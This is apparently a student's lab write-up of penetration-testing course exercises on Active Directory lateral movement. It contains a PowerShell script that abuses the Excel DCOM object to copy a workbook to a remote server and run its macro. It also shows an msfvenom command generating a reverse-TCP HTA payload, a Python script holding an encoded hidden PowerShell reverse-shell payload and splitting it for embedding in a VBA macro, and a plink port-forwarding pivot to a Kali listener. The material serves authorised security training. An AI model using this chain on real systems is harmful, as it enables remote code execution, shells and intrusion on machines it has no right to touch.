21.4.4.1

# 21.4.4.1.1. Repeat the exercise of launching Notepad using Excel and DCOM.

Log onto the Windows 10 client as corp\jeff_admin. 
![7657ff02b284b9c8d0b923c438705784.png](8d595d0191c349bc9fb48042a28921bb.png)

Discover the available methods or sub-objects for the *Excel Application* DCOM object. We are operating from the Windows 10 client as corp\jeff_admin (a local admin on the remote machine).

Here is the powershell script
```powershell
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ cat createDcomObjectAndEnumerateMethods.ps1 
i$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "172.16.214.5"))
$com | Get-Member
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$
```

Run the script on Windows 10 client
![1f9ac5b097e7dcebb02c854869594b77.png](3616966c74904c6ebbe069e6726ac840.png)
Part of the output shows the Run method, which will allow us to execuate a Visual Basic for Applications macro remotely
![5ce574638f6320081a37513c6f6d9727.png](ba597cadb3b7414b81dd797c6fa1cb60.png)
There is also a Workbooks object
![03e5d90e34899c0d5a1af67fbe1a95d5.png](98e1b5af69c94ba79363cc3e42d670a3.png)

Open Excel -> View ribbon -> Macros -> View Macros
![eba50e70b2b6ff62916f379f209a68e3.png](dbd0f305aac246798168681f76340b6d.png)

Enter Macro name: mymacro -> Create
![83a9f8f522a59121687fbd5b2b7ebb95.png](2f8ec7182ea848fd97c896c30df08998.png)

Add code to mymacro() for launching notepad.exe ->. Close and return to Microsoft Excel
![d224401a02ce84e5d9204ccecefa40bf.png](2f31b8c2f7a84ec9a5104b6542191d8a.png)

I've saved the file as an Excel 97-2003 Workbook (.xls extension) named myexcel.xls on the jeff_admin desktop
![3629da9e1117a21cbd5bf8e0d34ec931.png](2eeb76450c654ed2b6d5bf7394c31240.png)
![e6df9362400449f42f6838388f432288.png](5376f3951d3043c9b5bdbb33b82d11bd.png)

Create a script to execute Excel macro remotely.
```powershell
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ cat poc_executeExcelMacroRemotely.ps1 
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "172.16.214.5"))

$LocalPath = "C:\Users\jeff_admin\Desktop\myexcel.xls"
$RemotePath = "\\172.16.214.5\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\172.16.214.5\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")
```

Run this script
```plaintext
PS C:\Users\jeff_admin\Desktop> .\poc_executeExcelMacroRemotely.ps1
```
![125bcfe9e20d47a93e29ae5148310eb9.png](0432243d1a614812823a738a42c59e18.png)


Now if you logon to the Windows Server as jeff_admin, you'll see under the Task Manager that notepad is running as a background process.
![bfbbe7d06b8d7aae9d107ce9e697173d.png](7e12acd4c72d448db83372cfc4c82af1.png)
![29c8c1127b3d1c04b5283bea58c0eca4.png](0ad4bc7d32b74e81b1da74dbc04c7aa7.png)
![c5ecab71b245d3e28ab87f81d88df126.png](6bb2280020c74f9da5d824cdfa3a6c34.png)


# 21.4.4.1.2. Improve the attack by replacing the VBA macro with a reverse shell connecting back to Netcat on your windows student VM.

Get the IP address of the Windows client that is on the same network as Windows Server. We see the Windows client Ethernet1 is 172.16.214.10
`ipconfig`
![290cf8de88208e0397407d69a1619ee7.png](a124a6e2227345bc974fa62be81d7785.png)

Create a payload for an hta attack
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ msfvenom -p windows/shell_reverse_tcp lhost=172.16.214.10 lport=4444 -f hta-psh -o evil.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 6663 bytes
Saved as: evil.hta
```

Here is what evil.hta looks like
![70a16980583f19e0f0f242cee641f9d8.png](4e9ecb927b6a4eb3b48a7aa3092bc625.png)

Create a Python script to split the Base64-encoded string. We copy the line starting with "powershell.exe -nop -w hidden -e" followed by the Base64 encoded payload. This script sploits the command into smaller chunks which bypasses the size limit on literal strings in Excel macros.
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ cat splitBase64EncodedString.py 
str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGo
...
dQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="

n = 50

for i in range(0, len(str), n):
    print "Str = Str + " + '"' + str[i:i+n] + '"'
```

Run the python script
```
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ python splitBase64EncodedString.py
```
![d405122bcaba2a26b2baeffba0d7767c.png](f57fadba38c4483193d25251351a8fd6.png)

Update the mymacro() in myexcel.xls to inlude the powershell string
![dbd4325ae05f3e699fcb144ab0eebd65.png](e71b5fb1b3464efeae6c37e4e5505cd7.png)
![9baf0fca01aca53bd70195046bf3bfe7.png](2bec49f323d84691b0b9d4adc936c645.png)

Before executing the macro, start a netcat listener on the Windows 10 client
![7d6eaff62d72b579bd3236636c1bb7bf.png](909356d2a16d4658b4796247d8bd7b6e.png)

Execute the same powershell script we used to launch notepad. **Be sure to end any processes in Task Manager related to executing Excel macros on the Windows Server first.**
```plaintext
PS C:\Users\jeff_admin\Desktop> .\poc_executeExcelMacroRemotely.ps1  
```
![7af922f5fad02e29de8f930c45965833.png](675a4f4af1724d7d8803562d60368781.png)

We now have a shell on the Windows 10 client
![d212d325726d3b4963339497b201c984.png](78f7c40f98b44396956c1588162751fe.png)

Here are the advanced security settings for Excel and powershell.exe on the Windows server once the macro was execute.
Excel
![5f3ef33ba630de5aa7b5f77ecb2d6f63.png](c621e4212c5f4baeab31f9785796128c.png)
Powershell
![619746bf0f1a146759ddcc32b7383a73.png](2297b1d221b14959bacd539e62095e2d.png)


# 21.4.4.1.3. Set up a pivoting channel from the domain controller to your Kali machine and obtain a reverse shell.

### Start the services we can exploit on Windows 10 client
Start the SyncBreeze service on the Windows 10 client
![213cf9a4f63368f57de7a5c5211c54f7.png](07e67bb66bb14cbeb30f289d1d95a83d.png)


### Assume that we have gained access to a Windows 10 machine and have a system level shell. We will use a previous exploit from Exercise 15.1.7.1.1 which exploits SyncBreeze to do this.

Open a netcat listener on Kali
![14265837fa15ec998f6729eaca668a4a.png](48ded8585a73475d879058133b455ede.png)

Run the syncbreeze exploit
![3f512d0cc967be2888b1f65ef83004db.png](53616e81bb144213b44fa6778dd35304.png)

Notice we have a SYSTEM level reverse shell on the Windows 10 client
![873efecc6a1abd34dba4fdbf33dc8c45.png](cd5535ad13d14ad487cfe4e98c2482cf.png)

### Perform a local port forwarding using plink.exe

Start the ssh service on Kali if necessary
![b8f2d9e2775f6aae592f29a7ad31f182.png](70dde9cb1be24ba18c5824cfdf55dbbf.png)

Open a netcat listener on Kali, we will choose port 5678
![c00488fddd59d0bcaae9b8c2b4b0793b.png](4e677c0e04ce44c59ac70553aa5c0167.png)

Run a port forward command on the Windows machine
```plaintext
c:\Tools\port_redirection_and_tunneling>plink.exe -N -L 0.0.0.0:4444:192.168.119.214:5678 kali@192.168.119.214
plink.exe -N -L 0.0.0.0:4444:192.168.119.214:5678 kali@192.168.119.214
The server's host key is not cached in the registry. You
have no guarantee that the server is the computer you
think it is.
The server's ssh-ed25519 key fingerprint is:
ssh-ed25519 256 48:34:e6:01:5f:9f:51:07:6c:27:4f:98:82:4c:22:5b
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n) y
kali@192.168.119.214's password: <kali_password>
```
![061fdbec83d661068a6d866787398f79.png](a6746f7f5689434abdae596f197333c4.png)

Run the execute macro script (the one that launches powershell) on Windows 10 client. **Remember, if you already have an Excel or powershell process running on the Windows Server 2016, you must close it prior to running the script.**
![b669696549b420400101cff9da38fdf1.png](2cee3d615eda4c16aa29751c6044beff.png)

Notice we have a shell on the Kali listener
![8868f0da31f18f270e6fd68abe4e00f1.png](12e54fc7625a4a2eb5c5b4e1e3d47f9f.png)












